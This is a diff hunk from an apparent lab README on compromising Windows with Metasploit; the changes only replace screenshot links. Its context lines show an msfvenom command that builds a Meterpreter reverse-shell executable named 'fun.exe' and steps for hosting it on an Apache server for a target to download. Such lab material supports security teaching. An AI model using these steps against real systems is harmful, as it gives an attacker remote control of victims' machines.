@@ -40,18 +40,20 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 
 
 copy the fun.exe into the apache /var/www/html folder
-![2](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/37d7e507-5d47-4ddb-ba93-586f6d73a51b)
+![Screenshot 2025-04-07 115010](https://github.com/user-attachments/assets/f556dedd-f7d9-47bc-b786-0d2017262af3)
+
 
 
 Start apache server
 sudo systemctl apache2 start
 
-![3](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/0d0224f9-d80c-42b9-a3ab-09b48da66a27)
+![Screenshot 2025-04-07 115019](https://github.com/user-attachments/assets/f8a3a5db-f3a1-4089-865b-bf898995674f)
 
 
 
 Check the status of apache2
-![4](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/77516604-9c4f-4317-a188-c41de4625542)
+![Screenshot 2025-04-07 115108](https://github.com/user-attachments/assets/e5f1d4d7-126a-4b09-b6ef-eb06a680981f)
+
 
 
 
